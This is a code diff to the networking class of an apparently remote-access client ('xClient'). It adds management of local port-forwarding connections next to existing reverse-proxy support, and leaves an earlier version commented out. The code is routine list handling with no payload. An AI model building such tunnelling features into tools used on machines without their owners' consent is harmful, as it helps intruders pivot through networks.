@@ -10,6 +10,8 @@ using xClient.Core.Cryptography;
 using xClient.Core.Extensions;
 using xClient.Core.NetSerializer;
 using xClient.Core.Packets;
+using xClient.Core.PortForward.Local;
+using xClient.Core.PortForward.Local.Packets;
 using xClient.Core.ReverseProxy;
 using xClient.Core.ReverseProxy.Packets;
 
@@ -188,6 +190,13 @@ namespace xClient.Core.Networking
         /// </summary>
         private readonly object _proxyClientsLock = new object();
 
+        // antp
+        //private List<PortForwardInstance> _forwardInstances;
+        //private readonly object _forwardInstancesLock = new object();
+
+        private List<LocalPortForwardClient> _localForwardClients;
+        private readonly object _localForwardClientsLock = new object();
+
         /// <summary>
         /// The buffer for incoming packets.
         /// </summary>
@@ -267,6 +276,8 @@ namespace xClient.Core.Networking
         protected Client()
         {
             _proxyClients = new List<ReverseProxyClient>();
+            //_forwardInstances = new List<PortForwardInstance>();
+            _localForwardClients = new List<LocalPortForwardClient>();
             _readBuffer = new byte[BUFFER_SIZE];
             _tempHeader = new byte[HEADER_SIZE];
         }
@@ -750,5 +761,77 @@ namespace xClient.Core.Networking
             }
             catch { }
         }
+
+        //public void CreatePortForwardInstance(PortForwardInit command)
+        //{
+        //    lock (_forwardInstancesLock)
+        //    {
+        //        _forwardInstances.Add(new PortForwardInstance(command, this));
+        //    }
+        //}
+
+        //public PortForwardInstance GetForwardInstanceById(int instanceId)
+        //{
+        //    lock (_forwardInstancesLock)
+        //    {
+        //        return _forwardInstances.FirstOrDefault(t => t.InstanceId == instanceId);
+        //    }
+        //}
+
+        //public void RemoveForwardInstance(int instanceId)
+        //{
+        //    try
+        //    {
+        //        lock (_forwardInstancesLock)
+        //        {
+        //            for (int i = 0; i < _forwardInstances.Count; i++)
+        //            {
+        //                if (_forwardInstances[i].InstanceId == instanceId)
+        //                {
+        //                    _forwardInstances.RemoveAt(i);
+        //                    break;
+        //                }
+        //            }
+        //        }
+        //    }
+        //    catch { }
+        //}
+
+        public void CreateLocalPortForwardClient(LocalPortForwardConnect command)
+        {
+            lock (_localForwardClientsLock)
+            {
+                _localForwardClients.Add(new LocalPortForwardClient(command, this));
+            }
+        }
+
+        public LocalPortForwardClient GetLocalForwardCLientById(int id)
+        {
+            lock (_localForwardClientsLock)
+            {
+                return _localForwardClients.FirstOrDefault(t => t.ClientId == id);
+            }
+        }
+
+        public void RemoveLocalPortForwardClient(int id)
+        {
+            try
+            {
+                lock (_localForwardClientsLock)
+                {
+                    for (int i = 0; i < _localForwardClients.Count; i++)
+                    {
+                        if (_localForwardClients[i].ClientId == id)
+                        {
+                            _localForwardClients.RemoveAt(i);
+                            break;
+                        }
+                    }
+                }
+            }
+            catch { }
+        }
+
+
     }
 }
